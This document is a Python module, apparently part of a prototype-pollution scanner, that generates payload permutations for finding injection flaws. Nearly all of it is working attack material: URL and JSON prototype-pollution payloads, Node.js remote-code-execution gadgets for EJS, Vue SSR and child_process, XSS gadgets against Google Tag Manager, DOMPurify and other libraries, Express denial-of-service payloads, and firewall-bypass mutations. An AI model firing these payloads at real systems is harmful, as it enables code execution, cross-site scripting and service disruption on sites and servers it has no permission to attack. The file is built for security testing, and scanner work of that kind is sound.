"""
PPMAP v4.4.2 — Payload Permutation Engine

Systematically generates PP payloads across 10+ notation/encoding
variations for comprehensive coverage. Used by scanner test methods
to ensure every gadget property is tested with all bypass variants.
"""
import urllib.parse
from typing import List, Tuple


def generate_pp_permutations(prop: str, value: str = "ppmap_test") -> List[str]:
    """Generate 10+ query string permutations for a single PP property.

    Args:
        prop: The property name to pollute (e.g., 'polluted', 'isAdmin').
        value: The value to set (default: 'ppmap_test').

    Returns:
        List of payload query strings (each starts with ? or #).
    """
    return [
        # Standard notations
        f"?__proto__[{prop}]={value}",
        f"?__proto__.{prop}={value}",
        f"?constructor[prototype][{prop}]={value}",
        f"?constructor.prototype.{prop}={value}",
        # URL-encoded bracket
        f"?__proto__%5B{prop}%5D={value}",
        # Unicode hex escape (__proto__ = \x5f\x5f\x70\x72\x6f\x74\x6f\x5f\x5f)
        f"?%5f%5f%70%72%6f%74%6f%5f%5f[{prop}]={value}",
        # Double URL encoding
        f"?%255f%255fproto%255f%255f[{prop}]={value}",
        # Fragment-based (WAF bypass — not sent to server)
        f"#__proto__[{prop}]={value}",
        f"#constructor[prototype][{prop}]={value}",
        # Sanitizer evasion (nested __proto__ inside stripped key)
        f"?__pro__proto__to__[{prop}]={value}",
    ]


def generate_json_permutations(prop: str, value: str = "ppmap_test") -> List[dict]:
    """Generate JSON body permutations for POST-based PP testing.

    Args:
        prop: The property name to pollute.
        value: The value to set.

    Returns:
        List of JSON payload dicts.
    """
    return [
        # Standard __proto__
        {"__proto__": {prop: value}},
        # Constructor path
        {"constructor": {"prototype": {prop: value}}},
        # Nested __proto__ (double pollution)
        {"__proto__": {"__proto__": {prop: value}}},
        # Mixed with legitimate data
        {"name": "test", "__proto__": {prop: value}},
    ]


# ============================================
# PRE-BUILT GADGET PAYLOADS
# ============================================

# Server-Side RCE Gadgets (Node.js)
SSPP_RCE_GADGETS: List[Tuple[str, dict, str]] = [
    # (name, payload, description)
    (
        "child_process_shell",
        {"__proto__": {"shell": "node", "NODE_OPTIONS": "--require /proc/self/cmdline"}},
        "RCE via child_process shell override",
    ),
    (
        "child_process_env",
        {"__proto__": {"env": {"NODE_DEBUG": "child_process"}}},
        "Info leak via env pollution",
    ),
    (
        "child_process_argv0",
        {"__proto__": {"argv0": "node", "shell": True}},
        "RCE via argv0 override (Blitz.js style)",
    ),
    (
        "ejs_escape_function",
        {
            "__proto__": {
                "client": 1,
                "escapeFunction": "1;process.mainModule.require('child_process').exec('id')",
            }
        },
        "RCE via EJS escapeFunction gadget",
    ),
    (
        "ejs_output_function",
        {
            "__proto__": {
                "outputFunctionName": "_tmp1;global.process.mainModule.require('child_process').exec('id');var __tmp1",
            }
        },
        "RCE via EJS outputFunctionName gadget",
    ),
    (
        "vue_ssr_cssvars",
        {
            "__proto__": {
                "ssrCssVars": "1}; return process.mainModule.require('child_process').execSync('id')//",
            }
        },
        "RCE via Vue.js SSR ssrCssVars gadget",
    ),
    (
        "worker_threads_eval",
        {"__proto__": {"eval": "require('child_process').execSync('id')"}},
        "RCE via worker_threads eval gadget",
    ),
    (
        "require_main",
        {"__proto__": {"main": "/proc/self/cmdline"}},
        "Arbitrary require via main gadget",
    ),
    (
        "jsdom_runscripts",
        {"__proto__": {"runScripts": "dangerously", "resources": "usable"}},
        "RCE via jsdom runScripts gadget",
    ),
]

# Client-Side XSS Gadgets
CLIENT_XSS_GADGETS: List[Tuple[str, str, str, str, List[str]]] = [
    # (library, property, payload_value, impact, detection_keywords)
    ("Google Analytics", "hitCallback", "alert(1)", "XSS via setTimeout", ["ga(", "google-analytics", "_gaq"]),
    ("Google Tag Manager", "sequence", "alert(document.domain)", "RCE via GTM eval", ["googletagmanager", "dataLayer"]),
    ("Google Tag Manager", "event_callback", "alert(1)", "Callback hijacking", ["googletagmanager", "dataLayer"]),
    ("Adobe DTM", "cspNonce", '"><script>alert(1)</script>', "CSP bypass + XSS", ["adobe", "dtm", "satellite"]),
    ("Vue.js", "template", "<img src=x onerror=alert(1)>", "Component injection", ["vue.js", "__vue__", "v-if"]),
    ("DOMPurify", "ALLOWED_ATTR", "onerror", "Sanitizer bypass", ["dompurify", "DOMPurify.sanitize"]),
    ("reCAPTCHA", "srcdoc", "<script>alert(document.domain)</script>", "XSS via iframe srcdoc", ["recaptcha", "grecaptcha"]),
    ("Wistia", "innerHTML", "<img/src/onerror=alert(1)>", "Direct DOM XSS", ["wistia", "wistia-player"]),
    ("Knockout.js", "push", "alert(1)", "Array.prototype override", ["knockout", "data-bind", "ko."]),
    ("sanitize-html", "allowedTags", "*", "Sanitizer bypass", ["sanitize-html", "sanitizeHtml"]),
    ("i18next", "nsSeparator", "<script>alert(1)</script>", "Logic/XSS via i18n", ["i18next", "i18n.t"]),
]

# Express/Fastify Framework PP DoS
FRAMEWORK_DOS_PAYLOADS: List[Tuple[str, dict, str]] = [
    ("express_parameterLimit", {"__proto__": {"parameterLimit": 1}}, "DoS: next request with >1 param crashes"),
    ("express_ignoreQueryPrefix", {"__proto__": {"ignoreQueryPrefix": True}}, "Query parsing behavior change"),
    ("express_allowDots", {"__proto__": {"allowDots": True}}, "Dot notation parsing enabled"),
    ("express_json_spaces", {"__proto__": {"json spaces": 10}}, "Response formatting changed"),
    ("express_status", {"__proto__": {"status": 510}}, "Error status code overridden"),
]

# WAF Bypass Mutations
WAF_BYPASS_MUTATIONS: List[Tuple[str, str, str]] = [
    # (name, payload, description)
    ("hpp_comma", "?q=__pro&q=to__[polluted]=true", "HPP comma concatenation"),
    ("line_break", "?__proto__%0a[test]=polluted", "Line break injection"),
    ("new_function", "?__proto__[test]='+new Function('al'+'ert(1)')()+'", "Function constructor"),
    ("semicolon_break", "?q=1';let+a=window;a['alert'](1);'", "Semicolon break"),
    ("case_variation", "?__PROTO__[test]=polluted", "Case sensitivity test"),
    ("tab_bypass", "?__proto__%09[test]=polluted", "Tab character bypass"),
    ("null_byte", "?__proto__%00[test]=polluted", "Null byte injection"),
]
